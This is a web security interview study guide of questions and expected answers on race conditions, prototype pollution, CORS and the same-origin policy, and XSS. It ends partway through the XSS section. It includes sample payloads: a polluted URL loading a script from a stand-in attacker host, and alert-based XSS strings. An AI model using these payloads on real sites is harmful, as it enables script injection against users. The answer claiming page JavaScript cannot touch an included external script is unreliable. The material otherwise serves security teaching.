## Study Guide

#### Topics
1. Web Application
2. Web Services

#### Questions

**Race Conditions**:
1. What is a race condition?
2. What is a race window?
3. What is a limit overrun race condition?
4. How do you detect and exploit limit overrun race conditions?
5. What is the primary challenge for exploiting limit overrun race conditions?
6. What are the two mechanism that burp uses to reduce the challenges, mainly network jitter, and which version of HTTP are they used for? 
7. What is the Classic Last-Byte Synchronization Technique (for HTTP/1)?  
8. What is the Single-Packet Attack Technique (for HTTP/2)?
9. Explain how to prevent race condition vulnerabilities. 
10. Explain what a Time-of-Check to Time-of-Use (TOCTOU) race condition is and provide a strategy for mitigating such vulnerabilities.

**Prototype Pollution**:
1. What is prototype pollution?  
2. How do prototype pollution vulnerabilities arise?  
3. What is the special meaning of the \_\_proto\_\_ property?  
4. Is it possible to pollute any prototype object?  
5. Exploitation of prototype pollution requires the what key components?  
6. What are prototype pollution sources?  
7. Explain prototype pollution via the URL works?  
8. What is the role of the JSON.parse() method in the context of prototype pollution via JSON input?  
9. How can an attacker exploit the JSON.parse() method to achieve prototype pollution?  
10. Illustrate with an example how parsing malicious JSON leads to prototype pollution.  
11. Describe prototype pollution sinks?  
12. Describe prototype pollution gadgets?  
13. Give an example of a prototype pollution gadget.  

**Cross-Origin Resource Sharing (CORS) and (SOP)**:
1. What is CORS (cross-origin resource sharing)?  
2. What is the same-origin policy?  
3. In SOP what does an origin consist of and give an example.  
4. Consider the following URL: `http://normal-website.com/example/example.html`  
5. Why is the same-origin policy necessary?  
6. How is the same-origin policy implemented?  
7. Explain why the Same-Origin Policy does not allow JavaScript to read and manipulate data from images loaded from a different origin. Discuss the implications of this policy on web security.  
8. Consider a web page that includes an external script using a script tag like `<script src="http://external.com/script.js"></script>`. Discuss whether the JavaScript on the original page can directly access or manipulate the contents of the external script and explain why.  
9. Describe how the Same-Origin Policy affects the use of images in a `<canvas>` element when these images are loaded from a different origin. Include an explanation of what happens if proper CORS headers are not set and the concept of a "tainted" canvas.  
10. A web developer wishes to manipulate the pixel data of an image hosted on a different domain. Given the restrictions of the Same-Origin Policy, describe a secure method that the developer can use to achieve this goal.  
11. Discuss the role of browser enforcement in the Same-Origin Policy. Elaborate on the potential security risks and implications if this policy were not enforced by web browsers.  
12. What are the various exceptions to the same-origin policy?  
13. Is the same-origin policy is more relaxed when dealing with cookies and if so, how can you mitigate this risk?  
14. Is it possible to relax same-origin policy without CORS, if so how?  
15. Explain why CORS is not a solution for CSRF?  
16. What is a common intended usecase for a website to implement a CORS Policy?  
17. What are the key headers used in CORS?  
18. What is the Access-Control-Allow-Origin response header?  
19. What is the Access-Control-Allow-Credentials response header?  
20. What is the spec for ACAO:* and ACAC: true and do modern browsers allow a cross-domain server response in this form?  
21. Some web servers dynamically create Access-Control-Allow-Origin headers based upon the client-specified origin, what is the issue with this?  
22. Explain the purpose and usage of the Access-Control-Request-Method header in the context of CORS, particularly in how it functions during a preflight request?  
23. Consider a scenario where a subdomain (e.g., subdomain.vuln-site.com) of a website (vuln-site.com) is vulnerable to an XSS attack. The main site has a CORS policy with Access-Control-Allow-Origin set to the subdomain and Access-Control-Allow-Credentials: true. Assuming that the cookies on the subdomain are set with the HttpOnly flag, if an XSS attack on the subdomain triggers an AJAX request to vuln-site.com to access sensitive information that relies on the subdomain's cookies, will the HttpOnly flag prevent the transmission of these cookies in the request?  
24. How to prevent CORS-based attacks?  

**Cross-Site Scripting (XSS)**:
1. What is cross-site scripting (XSS)? 
2. What are the three main types of XSS attacks? 
3. What is cross-site scripting contexts? 
4. `<a href="#" onclick="... var input='controllable data here'; ...">` contains an xss where the application blocks or escapes quote characters. What payload can be used in this case and why?  
5. What are JavaScript template literals and how would you trigger an xss?
6. What is client-side template injection? 
7. What is one way you can XSS in hidden input fields?  
8. What is the difference between reflected XSS and stored XSS?
9. What is the difference between reflected XSS and self-XSS?
10. What can XSS be used for?  
11. What is DOM-based cross-site scripting? 
12. How are DOM-based XSS attack delivered?
13. What is the most common source for DOM XSS?
14. What is CSP (content security policy)?
15. Why should CSP not allow scripts from external domains such as content delivery networks (CDNs) that do not use per-customer URLs (e.g.`ajax.googleapis.com`)? 
16. In addition to whitelisting specific domains, content security policy also provides what two other ways of specifying trusted resources? 
17. What are some dangerous CSP configurations?
18. What is dangling markup injection?  
19. What is the consequence of dangling markup injection?
20. Is dangling markup only restricted to a few attributes? 
21. How to prevent dangling markup attacks? 
22. How can an attacker exploit a strict Content Security Policy (CSP) like default-src 'none'; base-uri 'none'; using the HTML `<base>` tag, and what are the key steps in this attack method?  
23. How is CSP with policy injection performed?
24. How to protect against clickjacking using CSP?  
25. How to prevent XSS attacks?

**Cross-Site Request Forgery (CSRF)**:
1. What is CSRF? 
2. What is the impact of a CSRF attack?  
3. How does CSRF work?
4. How do you construct a CSRF attack? 
5. What are some common defenses against CSRF?
6. What is a common way to share CSRF tokens with the client?
7. Why does a CSRF token when implemented correctly stop CSRF attacks?
8. What are some flaws in CSRF token validation?
9. What is SameSite?
10. What is a site in the context of SameSite cookies?
11. What's the difference between a site and an origin?
12. SameSite vs SameOrigin?
13. How does SameSite work? 
14. What are the SameSite restriction levels? 
15. What is an example that would necessitate SameSite=None?  
16. When setting a cookie with SameSite=None, what attribute must also be included? 
17. How does bypassing SameSite Lax restrictions using GET requests work?
18. How does bypassing SameSite restrictions using on-site gadgets work?
19. How does bypassing SameSite restrictions via vulnerable sibling domains work?
20. How does bypassing SameSite Lax restrictions with newly issued cookies work? 
21. What is the Referer header?
22. What are way to bypass Referer header validation?
23. How to prevent CSRF vulnerabilities?
24. The alternative approach, of placing the token into the URL query string, is somewhat less safe because the query string is?
25. How should CSRF tokens be validated?  

**Server-Side Request Forgery (SSRF)**:
1. What is SSRF?  
2. What is the impact of SSRF attacks?
3. What are some ways to deal with an SSRF with blacklist-based input filters?
4. What are some ways to deal with an SSRF with whitelist-based input filters?
5. What is blind SSRF?  
6. How to find and exploit blind SSRF vulnerabilities?  
7. How does SSRF via the Referer header work?
8. What are some SSRF mitigations?

**XML External Entity (XXE) Injection**:
1. What is XML external entity injection?
2. What is XML?
3. What are XML entities?
4. What is document type definition? 
5. What are XML custom entities? 
6. What are XML external entities?
7. How do XXE vulnerabilities arise?
8. What are the types of XXE attacks?
9. How do you exploit XXE to retrieve files? 
10. How would you perform an XXE to retrieve files?
11. How do test systematically for XXE vulnerabilities?
12. How do you exploit XXE to perform SSRF attacks?
13. How do you detect blind XXE?
14. How do you detect blind XXE using out-of-band (OAST) techniques?
15. How do you exploit blind XXE by repurposing a local DTD?
16. Where can you find hidden attack surfaces for XXE injection?
17. What is an XInclude attack?
18. What is an XXE attacks via file upload?
19. How to find and test for XXE vulnerabilities?
20. Can you use XML-based functionality for other vulnerabilities?
21. How to prevent XXE vulnerabilities?

**SQL Injection**:
1. What is SQL injection (SQLi)?  
2. How to detect SQL injection vulnerabilities? 
3. What parts of a query can SQL injection occur? 
4. Describe a method by which SQL injection can be used to display all items in a database of this query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` where 'Gifts' is user input.
5. Describe a method by which SQL injection can be used to display all items in a database, regardless of specific conditions or filters? 
6. In cases where the application responds with the results of a SQL query, how can an attacker use a SQL injection vulnerability to retrieve data from other tables within the database?   
7. Explain how this query works `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`?  
8. What two key requirements must be met for a `UNION` query to work?  
9. To carry out a SQL injection UNION attack what does it normally involve finding out?  
10. What are the two effective methods to determine the number of columns being returned from the original query in a SQL injection `UNION` attack? 
11. How is the method involving `ORDER BY` clauses executed in a SQL injection attack to determine the number of columns?  
12. How does the method using `UNION SELECT` payloads with `NULL` values work in identifying the number of columns in a SQL injection attack?  
13. Why is `NULL` used as the values returned from the injected `SELECT` query?  
14. For a SQL injection UNION attack why do you need to find one or more columns in the original query results whose data type is, or is compatible with, string data?  
15. To exploit SQL Injection it's often necessary to find out what information about the database?  
16. What payloads can be potentially used to identify database type and version?
17. What query can be used to list the tables in a database?  
18. What query can be used to list the tables in an Oracle database?  
19. What is a first-order and second-order SQL injection?  
20. How to prevent SQL injection?
21. The following code is vulnerable to SQL injection because the user input is concatenated directly into the query. Fix it.  
22. What parts of the query does parameterized queries work, and where do they not?  
23.  If an application places untrusted input into tables or column names, or the `ORDER BY` clause, how can this be remediated?  
24. What is a prepared statement? 

**Clickjacking**:
1. What is clickjacking?  
2. How to construct a basic clickjacking attack?
3. When are clickjacking attacks possible?  
4. What are frame busting scripts?  
5. What is an effective attacker workaround against frame busters?
6. What are the key elements that make combining clickjacking with a DOM-based Cross-Site Scripting (DXSS) attack particularly effective?  
7. How to prevent clickjacking attacks?
8. How to prevent clickjacking attacks with X-Frame-Options?
9. How to prevent clickjacking attacks with Content Security Policy (CSP)? 

**HTTP Request Smuggling**:
1. What is HTTP request smuggling?
2. What happens in an HTTP request smuggling attack?
3. How do HTTP request smuggling vulnerabilities arise?
4. What is an example of a HTTP request smuggling vulnerabilities with Transfer-Encoding? 
5. What are the two methods provided by the HTTP/1 specification for specifying the length of HTTP messages, and what conflict arises when they are used together?
6. Why might the HTTP specification's rule to ignore the Content-Length header in the presence of Transfer-Encoding not be sufficient in a multi-server environment?
7. What are the two main reasons why inconsistencies in handling Transfer-Encoding headers can lead to request smuggling vulnerabilities?
8. How can differing server behaviors regarding Transfer-Encoding headers result in request smuggling vulnerabilities?
9. Are websites that use HTTP/2 end-to-end inherently immune to request smuggling attacks?
10. How to perform an HTTP request smuggling attack?
11. Explain CL.TE vulnerabilities?
12. Explain TE.CL vulnerabilities?
13. Explain TE.TE vulnerabilities?
14. What is the most generally effective way to detect HTTP request smuggling vulnerabilities?
15. How to confirm HTTP request smuggling vulnerabilities?
16. What can exploiting HTTP request smuggling vulnerabilities lead to?
17. What is HTTP/2 downgrading?
18. How to prevent HTTP request smuggling vulnerabilities? 

**Server-Side Template Injection**:
1. What is server-side template injection?
2. What is the impact of server-side template injection?
3. How do server-side template injection vulnerabilities arise?
4. How do detect server-side template injection vulnerabilities?
5. What are the two distinct contexts in server-side template injection vulnerabilities?
6. How to prevent server-side template injection vulnerabilities?


### Web Security

Content will be separated by attack types.

#### Race conditions

1. What is a race condition attack?  
**Expected Answer**: A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior.

1. What is a race window?  
**Expected Answer**: The period of time during which a collision is possible.

1. What is a limit overrun race condition?  
**Expected Answer**: A limit overrun race condition occurs when multiple threads or processes concurrently modify a shared resource, like a counter or an array index, without proper synchronization, potentially causing the resource to exceed its predefined limit.

1. How do you detect and exploit limit overrun race conditions?  
**Expected Answer**: 

   * Identify a single-use or rate-limited endpoint that has some kind of security impact or other useful purpose.
   * Issue multiple requests to this endpoint in quick succession to see if you can overrun this limit.

1. What is the primary challenge for exploiting limit overrun race conditions?  
**Expected Answer**: The primary challenge is timing the requests so that at least two race windows line up, causing a collision. This issues can stem from network latency, jitter, and internal latency. This window is often just milliseconds and can be even shorter.

1. What are the two mechanism that burp uses to reduce the challenges, mainly network jitter, and which version of HTTP are they used for?  
**Expected Answer**: 

   * For HTTP/1, it uses the classic last-byte synchronization technique.
   * For HTTP/2, it uses the single-packet attack technique

1. What is the Classic Last-Byte Synchronization Technique (for HTTP/1)?  
**Expected Answer**: The "last-byte synchronization" method involves preparing multiple requests and then sending all but the last byte of each request to the server. These partial requests are held by the server, waiting for completion. Once all the requests are almost fully sent, the final bytes are rapidly sent out. This causes the server to receive the end of all requests in quick succession, effectively simulating a race condition. This technique relies on the behavior of TCP and HTTP/1, where multiple requests can be lined up on the same connection, and the server processes them as they are fully received.

1. What is the Single-Packet Attack Technique (for HTTP/2)?  
**Expected Answer**: HTTP/2 allows multiple requests to be sent concurrently over the same connection using a multiplexing feature. This means that different requests can be intermingled on the wire, sent in fragments (frames) in an interleaved fashion. The "single-packet attack" refers to a method where the entire request or critical parts of different requests are crafted to fit within a single TCP packet. This can ensure that multiple requests (or critical parts of them) are processed by the server very closely together in time. By controlling the packet construction in this manner, a tester can more effectively simulate race conditions in an HTTP/2 environment, as the server receives and processes these requests in rapid succession.

1. Explain how to prevent race condition vulnerabilities.  
**Expected Answer**: 

   * Synchronization mechanisms, like mutexes, semaphores, critical sections, and locks, help in controlling access to shared resources in a concurrent environment. By ensuring that only one thread or process can access a shared resource at a time, these mechanisms prevent simultaneous conflicting accesses which can lead to race conditions.
   * Atomic operations are executed in a single, indivisible step, ensuring that they complete entirely without any interruption. This characteristic is crucial for preventing race conditions because it ensures the integrity and consistency of operations on shared resources. When an operation is atomic, no other thread can observe the operation in a half-completed state, thereby preventing concurrent access issues.
   * Minimizing shared state involves reducing the amount of data or resources shared among multiple threads or processes. Designing systems with more self-contained and independent modules can effectively minimize shared state.

1. Explain what a Time-of-Check to Time-of-Use (TOCTOU) race condition is and provide a strategy for mitigating such vulnerabilities.  
**Expected Answer**: A Time-of-Check to Time-of-Use (TOCTOU) race condition occurs when a program checks the state of a resource, like a file or a database entry, and then uses that resource based on the check's results at a later time. If the resource's state changes between the check and the use, it can lead to inconsistencies or security vulnerabilities. For example, a program might check if a file exists and has the right permissions, but by the time it actually reads the file, the file might have been changed or replaced.
To mitigate TOCTOU vulnerabilities, one effective strategy is to perform the check and the use of the resource as a single atomic operation, ensuring that the state does not change between the check and the use. Another approach is to use file locks or transactional mechanisms where the resource is locked during the check and remains locked until the use is completed.

#### Prototype Pollution

1. What is prototype pollution?  
**Expected Answer**: Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects. Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

1. How do prototype pollution vulnerabilities arise?  
**Expected Answer**: when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties. The merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.

1. What is the special meaning of the \_\_proto\_\_ property?  
**Expected Answer**: Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, \_\_proto\_\_ is the de facto standard used by most browsers. This property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary. 

1. Is it possible to pollute any prototype object?  
**Expected Answer**: Yes, but this commonly occurs with the built-in global `Object.prototype`.

1. Exploitation of prototype pollution requires the what key components?  
**Expected Answer**: 

   * A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
   * A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
   * An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

1. What are prototype pollution sources?  
**Expected Answer**: A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:

   * The URL via either the query or fragment string (hash)
   * JSON-based input
   * Web messages

1. Explain prototype pollution via the URL works?  
**Expected Answer**: For the url `https://vuln.com/?__proto__[evilProperty]=payload`. A URL parser may interpret `__proto__` as an arbitrary string, but if `key:value` are merged into an existing object as properties. The recursive merge operation may assign the value of evilProperty using a statement equivalent to the following: `targetObject.__proto__.evilProperty = 'payload';` During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.

1. What is the role of the JSON.parse() method in the context of prototype pollution via JSON input?  
**Expected Answer**: The JSON.parse() method is used to convert a JSON string into a JavaScript object. It treats all keys in the JSON object as arbitrary strings, including special keys like `__proto__`. This behavior can potentially lead to prototype pollution if the JSON input is not properly sanitized, especially when such input is user-controllable.

1. How can an attacker exploit the JSON.parse() method to achieve prototype pollution?    
**Expected Answer**: An attacker can exploit the JSON.parse() method by injecting malicious JSON with special keys, like \_\_proto\_\_, which are then treated as regular object properties. For example, an attacker could inject a JSON string like `{"__proto__": {"evilProperty": "payload"}}`. When this string is parsed using JSON.parse(), it creates an object with a \_\_proto\_\_ property, which is not typical behavior for standard JavaScript object literals. This can lead to unintended modifications in the prototype chain

1. Illustrate with an example how parsing malicious JSON leads to prototype pollution.  
**Expected Answer**: `const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');`
In this case, objectFromJson will have a property \_\_proto\_\_ with the value `{evilProperty: 'payload'}`. Unlike an object literal that directly sets \_\_proto\_\_, like `const objectLiteral = {__proto__: {...}}`, where \_\_proto\_\_ is not actually a property of the object, the object created via JSON.parse() treats \_\_proto\_\_ as a regular property. If this object is later merged into another object without proper sanitization, it could modify the prototype of the latter, leading to pollution.

1. Describe prototype pollution sinks?  
**Expected Answer**: A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.

1. Describe prototype pollution gadgets?  
**Expected Answer**: A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

   * Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization
   * Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

   A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to null, which ensures that it doesn't inherit any properties at all.

1. Give an example of a prototype pollution gadget.  
**Expected Answer**: A JavaScript library uses a configuration object to set various options. It includes a line like let transport_url = config.transport_url || defaults.transport_url; to determine a URL for script loading. If transport_url isn't set by the developer, the library defaults to a predefined option.
However, this approach can be exploited if an attacker is able to pollute the global Object.prototype with their own transport_url property. This polluted property would then be inherited by the config object, causing the library to load a script from an attacker-controlled domain.
Manipulating the transport_url via a query parameter in the website URL. For example, by directing a victim to https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net, the attacker can make the victim's browser load a malicious script. Alternatively, an XSS payload can be embedded directly using a data: URL, like https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//, with the trailing // serving to comment out any suffixes added by the library.

#### Cross-Origin Resource Sharing (CORS)

1. What is CORS (cross-origin resource sharing)?  
**Expected Answer**: Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). CORS is about controlling access to resources from different domains, focusing on a "read" access model.

1. What is the same-origin policy?  
**Expected Answer**: The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other. The same-origin policy restricts scripts on one origin from accessing data from another origin. 

1. In SOP what does an origin consist of and give an example.    
**Expected Answer**: An origin consists of a URI scheme, domain and port number. For example, consider the following URL: http://normal-website.com/example/example.html where `http` is the scheme, the domain `normal-website`, and the port number `80`.

1. Consider the following URL: `http://normal-website.com/example/example.html`

   | URL accessed | Access permitted? |
   | ----------- | ----------- |
   | http://normal-website.com/example/      | ?       |
   | http://normal-website.com/example2/   | ?        |  
   | https://normal-website.com/example/   | ?        |  
   | http://en.normal-website.com/example/   | ?        |  
   | http://www.normal-website.com/example/	   | ?        |  
   | http://normal-website.com:8080/example/   | ?        |  

   **Expected Answer**: 
   | URL accessed | Access permitted? |
   | ----------- | ----------- |
   | http://normal-website.com/example/      | Yes: same scheme, domain, and port      |
   | http://normal-website.com/example2/   | Yes: same scheme, domain, and port        |  
   | https://normal-website.com/example/   | No: different scheme and port        |  
   | http://en.normal-website.com/example/   | No: different domain        |  
   | http://www.normal-website.com/example/	   | No: different domain        |  
   | http://normal-website.com:8080/example/   | No: different port*        |  

       * Internet explorer will allow this access because IE does not account for the port number in same-origin policy


1. Why is the same-origin policy necessary?  
**Expected Answer**: When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request. This means that the response will be generated within the user's session, and include any relevant data that is specific to the user. Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc.

1. How is the same-origin policy implemented?  
**Expected Answer**: The same-origin policy generally controls the access that JavaScript code has to content that is loaded cross-domain. Cross-origin loading of page resources is generally permitted. For example, the SOP allows embedding of images via the `<img>` tag, media via the `<video>`, `<audio>` tag,  stylesheets `<link>` tag, and JavaScript includes with the `<script>` tag. However, while these external resources can be loaded by the page, any JavaScript on the page won't be able to read the contents of these resources.

1. Explain why the Same-Origin Policy does not allow JavaScript to read and manipulate data from images loaded from a different origin. Discuss the implications of this policy on web security.  
**Expected Answer**: The Same-Origin Policy does not allow JavaScript to read or manipulate data from images loaded from a different origin. This policy ensures that scripts run in the context of one web page cannot access data from another web page unless both pages have the same origin. This is crucial for web security as it prevents potential data theft and privacy breaches.

1. Consider a web page that includes an external script using a script tag like `<script src="http://external.com/script.js"></script>`. Discuss whether the JavaScript on the original page can directly access or manipulate the contents of the external script and explain why.  
**Expected Answer**: The JavaScript on the original page cannot directly access or manipulate the contents of the external script. This restriction is due to the Same-Origin Policy, which prevents scripts from one origin from accessing data from a different origin to protect against Cross-Site Scripting (XSS) attacks and data theft.

1. Describe how the Same-Origin Policy affects the use of images in a `<canvas>` element when these images are loaded from a different origin. Include an explanation of what happens if proper CORS headers are not set and the concept of a "tainted" canvas.  
**Expected Answer**: Under the Same-Origin Policy, when images from a different origin are used in a `<canvas>` element, the canvas is "tainted." This means that JavaScript cannot read the data from this canvas, such as pixel values. This restriction prevents the canvas from being used as a channel to leak information from cross-origin images. If proper CORS headers are set, this restriction can be lifted, allowing JavaScript to manipulate the image data within the canvas.

1. A web developer wishes to manipulate the pixel data of an image hosted on a different domain. Given the restrictions of the Same-Origin Policy, describe a secure method that the developer can use to achieve this goal.  
**Expected Answer**: To manipulate pixel data of an image hosted on a different domain, the developer could use a server-side proxy. The proxy fetches the image from the external domain and then serves it to the frontend as if it originated from the same domain, thus complying with the Same-Origin Policy.

1. Discuss the role of browser enforcement in the Same-Origin Policy. Elaborate on the potential security risks and implications if this policy were not enforced by web browsers.  
**Expected Answer**: Browsers enforce CORS policies by only allowing front-end JavaScript code to access responses from cross-origin requests if the server's CORS headers permit it. Without this policy, scripts could freely access and manipulate data from any source, leading to significant security risks such as data theft, session hijacking, and other forms of web-based attacks. This enforcement does not extend to the prevention of requests being sent; it only governs the visibility of responses to these requests in the client-side JavaScript.

1. What are the various exceptions to the same-origin policy?  
**Expected Answer**: 
   * Some objects are writable but not readable cross-domain, such as the `location` object or the `location.href` property from iframes or new windows.
   * Some objects are readable but not writable cross-domain, such as the `length` property of the `window` object (which stores the number of frames being used on the page) and the `closed` property.
   * The `replace` function can generally be called cross-domain on the `location` object.
   * You can call certain functions cross-domain. For example, you can call the functions `close`, `blur` and `focus` on a new window. The `postMessage` function can also be called on iframes and new windows in order to send messages from one domain to another.

1. Is the same-origin policy is more relaxed when dealing with cookies and if so, how can you mitigate this risk?  
**Expected Answer**: Due to legacy requirements, the same-origin policy is more relaxed when dealing with cookies, so they are often accessible from all subdomains of a site even though each subdomain is technically a different origin. You can partially mitigate this risk using the HttpOnly cookie flag.

1. Is it possible to relax same-origin policy without CORS, if so how?  
**Expected Answer**: It's possible to relax same-origin policy using `document.domain`. This special property allows you to relax SOP for a specific domain, but only if it's part of your FQDN (fully qualified domain name). For example, you might have a domain `marketing.example.com` and you would like to read the contents of that domain on `example.com`. To do so, both domains need to set `document.domain` to `example.com`. Then SOP will allow access between the two domains despite their different origins. In the past it was possible to set `document.domain` to a TLD such as `com`, which allowed access between any domains on the same TLD, but now modern browsers prevent this.

1. Explain why CORS is not a solution for CSRF?  
**Expected Answer**: CORS is about controlling access to resources from different domains, focusing on a "read" access model. CSRF, however, exploits "write" operations. It doesn’t need to read data from a cross-origin; instead, it induces a victim’s browser to send a state-changing request to a target site. CORS headers control which origins can fetch resources or read responses from a different origin. They don't control or restrict the sending of requests to different origins. CSRF exploits the fact that credentials, like cookies, are automatically included in requests. CORS does not change this behavior.

1. What is a common intended usecase for a website to implement a CORS Policy?  
**Expected Answer**: Many modern websites use CORS to allow access from subdomains and trusted third parties.

1. What are the key headers used in CORS?  
**Expected Answer**: 

   * Access-Control-Allow-Origin
   * Access-Control-Allow-Credentials
   * Access-Control-Request-Method
   * Access-Control-Request-Headers

1. What is the Access-Control-Allow-Origin response header?  
**Expected Answer**: The Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match. The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *.

1. What is the Access-Control-Allow-Credentials response header?  
**Expected Answer**: The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true

1. What is the spec for ACAO:* and ACAC: true and do modern browsers allow a cross-domain server response in this form?  
**Expected Answer**: The spec doesn't allow both a wildcard for ACAO and ACAC to be true. This is also enforced by most modern browsers, and will throw an error.

1. Some web servers dynamically create Access-Control-Allow-Origin headers based upon the client-specified origin, what is the issue with this?  
**Expected Answer**: If the ACAO response header is reflecting what the Origin header is from the request, then this means that absolutely any domain can access resources from the vulnerable domain. Combinded with ACAC: true it would allow any attacker to to pull sensitive information if the response contains any sensitive information such as an API key or CSRF token.

1. Explain the purpose and usage of the Access-Control-Request-Method header in the context of CORS, particularly in how it functions during a preflight request?  
**Expected Answer**: Under certain circumstances, when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request. This is called the pre-flight check. The server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed.

   ```
   OPTIONS /data HTTP/1.1
   Origin: https://normal-website.com
   Access-Control-Request-Method: PUT

   HTTP/1.1 204 No Content
   Access-Control-Allow-Origin: https://normal-website.com
   Access-Control-Allow-Methods: PUT, POST, OPTIONS
   Access-Control-Allow-Credentials: true
   Access-Control-Max-Age: 240
   ```
   This response sets out the allowed methods (PUT, POST and OPTIONS). In this particular case the cross-domain server also allows the sending of credentials, and the Access-Control-Max-Age header defines a maximum timeframe for caching the pre-flight response for reuse. If the request methods and headers are permitted (as they are in this example) then the browser processes the cross-origin request in the usual way.

1. Consider a scenario where a subdomain (e.g., subdomain.vuln-site.com) of a website (vuln-site.com) is vulnerable to an XSS attack. The main site has a CORS policy with Access-Control-Allow-Origin set to the subdomain and Access-Control-Allow-Credentials: true. Assuming that the cookies on the subdomain are set with the HttpOnly flag, if an XSS attack on the subdomain triggers an AJAX request to vuln-site.com to access sensitive information that relies on the subdomain's cookies, will the HttpOnly flag prevent the transmission of these cookies in the request?  
**Expected Answer**: No, the HttpOnly flag will not prevent the transmission of cookies in this scenario. While the HttpOnly flag makes the cookies inaccessible to JavaScript running on the client side, it does not prevent the browser from automatically including these cookies in HTTP requests to the domain which set them. Therefore, when the XSS exploit triggers an AJAX request to vuln-site.com, the browser will still include all relevant cookies, including those marked as HttpOnly, in the request headers. This behavior occurs due to the browser's adherence to the CORS policy set by vuln-site.com, which includes Access-Control-Allow-Credentials: true, allowing credentials (such as cookies) to be included in cross-origin requests.

1. How to prevent CORS-based attacks?  
**Expected Answer**: 

   * Proper configuration of cross-origin requests: If a web resource contains sensitive information, the origin should be properly specified in the Access-Control-Allow-Origin header.
   * Only allow trusted sites: Origins specified in the Access-Control-Allow-Origin header should only be sites that are trusted.


#### Cross-Site Scripting (XSS)

1. What is cross-site scripting (XSS)?  
**Expected Answer**: Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.

1. What are the three main types of XSS attacks?  
**Expected Answer**:  

   * Reflected XSS: where the malicious script comes from the current HTTP request.
   * Stored XSS: where the malicious script comes from the website's servers, such as a database.
   * DOM-based XSS: where the vulnerability exists in client-side code rather than server-side code.

1. What is cross-site scripting contexts?  
**Expected Answer**:  

   * The location within the response where attacker-controllable data appears.
   * Any input validation or other processing that is being performed on that data by the application.

1. `<a href="#" onclick="... var input='controllable data here'; ...">` contains an xss where the application blocks or escapes quote characters. What payload can be used in this case and why?  
**Expected Answer**: The `&apos;-alert(document.domain)-&apos;` payload will work as the `&apos;` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

1. What are JavaScript template literals and how would you trigger an xss?  
**Expected Answer**: JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax. When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. \<script\> var input = `${alert(document.domain)}`; \</script\>

1. What is client-side template injection?  
**Expected Answer**: Client-side template injection vulnerabilities arise when applications using a client-side template framework (AngularJS) dynamically embed user input in web pages. When rendering a page, the framework scans it for template expressions and executes any that it encounters. An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack.

1. What is one way you can XSS in hidden input fields?  
